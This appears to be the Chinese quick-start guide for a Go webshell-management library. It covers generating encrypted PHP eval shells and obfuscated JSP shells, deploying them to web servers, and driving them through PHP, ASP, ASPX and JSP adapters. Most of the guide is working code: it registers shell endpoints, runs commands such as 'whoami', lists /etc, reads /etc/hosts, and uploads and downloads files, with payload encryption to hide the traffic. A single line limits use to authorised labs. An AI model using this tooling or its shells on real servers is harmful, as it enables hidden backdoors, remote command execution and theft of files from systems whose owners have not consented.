# 快速开始

> 仅在已获得书面授权的靶场、自有系统或测试环境中使用。

## 安装

项目要求 Go 1.21 或更高版本：

```bash
go get github.com/Yliken/redbeanshellcore
```

## PHP：创建 Client 并执行只读操作

PHP 适配器的 `ClientFactory` 会创建 `httpform.Transport`。主 payload 默认提交到 `antpwd` 字段，也可以通过 Session Metadata 修改。

```go
package main

import (
    "context"
    "fmt"
    "time"

    "github.com/Yliken/redbeanshellcore/adapter/php"
    "github.com/Yliken/redbeanshellcore/core"
    "github.com/Yliken/redbeanshellcore/registry/memory"
)

func main() {
    ctx := context.Background()
    reg := memory.New()
    mgr, err := core.NewManager(reg, php.NewClientFactory())
    if err != nil { panic(err) }

    err = mgr.Register(ctx, core.NodeConfig{
        ID: "lab-01", Endpoint: "https://lab.example/shell.php",
        Adapter: "php", Transport: "httpform",
        Auth: map[string]string{"payload_form_field": "antpwd"},
    })
    if err != nil { panic(err) }

    client, err := mgr.Client(ctx, "lab-01")
    if err != nil { panic(err) }

    requestCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
    defer cancel()
    result, err := client.Do(requestCtx, php.NewPhpInfo())
    if err != nil { panic(err) }

    info := result.(*core.InfoResult)
    fmt.Printf("workdir=%s os=%s user=%s\n", info.Workdir, info.OS, info.User)
}
```

也可以直接使用 `core.NewClient` 和 `httpform.New`，适合不需要节点注册表的单节点程序。

## PHP 加密 shell（BodyCrypto）

先用 `php.CryptoShellSource(key)` 生成并部署 eval 型加密 shell，再使用 `php-eval` profile：

```go
key := []byte("0123456789abcdef0123456789abcdef")
shell := php.CryptoShellSource(key) // 部署到 shell.php

err = mgr.Register(ctx, core.NodeConfig{
    ID: "lab-enc", Endpoint: "https://lab.example/shell.php",
    Adapter: "php-eval", Transport: "httpform",
    Options: map[string]string{
        "crypto_key_hex": hex.EncodeToString(key),
        "crypto_mode": "aes-gcm",
    },
})
```

工厂会配置 httpform 的 `BodyCrypto`，并自动把 `Session.Adapter` 升级为 `php-eval`。手动组装时等价于：

```go
cr, _ := aesgcm.New(key)
tr := httpform.NewWithOptions(url, httpform.Options{BodyCrypto: cr})
sess := core.NewSession("lab-enc", url)
sess.Adapter = "php-eval"
client := core.NewClient(
    core.WithSession(sess),
    core.WithTransport(tr),
    core.WithBodyCrypto(cr),
)
```

shell 会把响应加密返回，transport 自动 `DecryptBody` 后再进入原解析链路。

## 常用操作

```go
info, _ := client.Do(ctx, php.NewPhpInfo())
exec, _ := client.Do(ctx, php.NewPhpExec("whoami"))
list, _ := client.Do(ctx, php.NewPhpFileList("/etc"))
read, _ := client.Do(ctx, php.NewPhpFileRead("/etc/hosts"))
download, _ := client.Do(ctx, php.NewPhpFileDownload("/tmp/data.bin"))
upload, _ := client.Do(ctx, php.NewPhpFileUpload("/tmp/out.txt", []byte("hello")))
```

返回值分别是 `*core.InfoResult`、`*core.ExecResult`、`*core.FileListResult`、`*core.FileReadResult` 或 `*core.BoolResult`。文件读取和下载的 `Data` 是二进制安全的 `[]byte`，不要先转成字符串再保存。

命令操作支持指定 shell 和环境变量；上传默认为覆盖模式：

```go
op := php.NewPhpExec("make").WithBin("/bin/bash").WithEnv("CC", "gcc")
appendOp := php.NewPhpFileUpload("/tmp/log", []byte("next\n")).WithAppend(true)
```

## ASP、ASPX 与 JSP

四个适配器都提供 `info`、`exec`、`file.list`、`file.read`、`file.download`、`file.upload` 六类操作。

- `adapter/asp`：经典 ASP/VBScript，提供 `NewClientFactory`。
- `adapter/aspx`：ASP.NET/C#，提供 `NewClientFactory`。
- `adapter/jsp`：Java/JSP，提供静态 Shell 和动态 Shell；其 `ClientFactory.NewClient` 明确返回错误，因此需要手动组装 Client。

JSP 静态 Shell 的最小调用方式：

```go
tr := httpform.New("https://lab.example/shell.jsp")
sess := core.NewSession("jsp-01", "https://lab.example/shell.jsp")
sess.Adapter = "jsp"
client := core.NewClient(core.WithSession(sess), core.WithTransport(tr))
result, err := client.Do(ctx, jsp.NewJspInfo())
```

先用 `jsp.ShellSource()` 或 `jsp.ShellSourceWith(obf)` 生成并部署对应 JSP 文件，再使用同一份 `Obfuscator` 构造操作。`WithDynamic()` 依赖 JDK 6–14 的 Nashorn，JDK 15 及以上应使用默认静态模式。

需要整包加密时使用 `jsp.CryptoBodyShellSource(key)` 部署 body 模式 shell，客户端按上面的 `BodyCrypto` 方式组装；只加密 action 字段的旧入口 `jsp.CryptoShellSource(key)` 仍保留。

## 只读策略与错误处理

生产或批量读取场景建议启用只读中间件：

```go
client := core.NewClient(
    core.WithSession(sess),
    core.WithTransport(tr),
    core.WithMiddleware(readonly.Middleware()),
)
```

`exec`、`file.upload` 和标记为写入/破坏性的操作会在进入 Transport 前被拒绝。错误统一为 `*core.OpError`，通过 `core.IsKind` 判断类别：

```go
if core.IsKind(err, core.ErrTimeout) { /* 超时 */ }
if core.IsKind(err, core.ErrRemoteRuntime) { /* 远端模板报错 */ }
if core.IsKind(err, core.ErrPolicyDenied) { /* 本地策略拦截 */ }
```

## 运行示例和测试

```bash
go run ./examples/jsp/
go run ./examples/crypto/
go test ./...
```

示例只演示模板生成、请求构建或本地 mock；真实请求必须替换为授权环境的 URL，并检查 TLS、代理和凭据配置。
